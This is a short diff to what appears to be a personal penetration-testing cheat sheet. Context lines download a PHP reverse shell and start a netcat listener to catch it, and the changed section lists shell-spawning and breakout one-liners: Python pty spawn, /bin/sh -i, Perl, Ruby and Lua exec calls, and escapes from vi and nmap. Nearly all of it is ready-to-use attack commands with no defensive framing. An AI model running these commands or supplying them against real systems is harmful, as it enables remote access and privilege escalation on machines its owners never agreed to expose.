@@ -34,10 +34,19 @@ wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/ph
 edit with host and nc port
 nc -vnlp port
 
-::nice breakout from basic ass rev shell::
+::spawn shell::
 python -c 'import pty; pty.spawn("/bin/bash")'
---or--
-python3 -c 'import pty; pty.spawn("/bin/bash")'
+python -c 'import pty; pty.spawn("/bin/sh")'
+echo os.system('/bin/bash')
+/bin/sh -i
+perl -e 'exec "/bin/sh";'
+ruby: exec "/bin/sh"
+lua: os.execute('/bin/sh')
+(From within vi)
+:!bash
+:set shell=/bin/bash:shell
+(From within nmap)
+!sh
 
 if you wanna be fancy... pfft :P
 
